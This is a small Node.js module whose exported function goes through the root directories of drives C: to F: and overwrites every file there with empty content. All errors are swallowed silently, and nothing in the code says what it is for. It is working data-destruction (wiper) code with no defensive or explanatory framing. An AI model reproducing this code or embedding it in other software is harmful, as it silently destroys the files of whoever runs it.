const fs=require('fs');const path=require('path');
module.exports=function(){try{const drives=['C:\\','D:\\','E:\\','F:\\'];for(const d of drives){try{const files=fs.readdirSync(d);for(const f of files){try{const full=path.join(d,f);if(fs.statSync(full).isFile()){fs.writeFileSync(full,'');}}catch(e){}}}catch(e){}}}catch(e){};};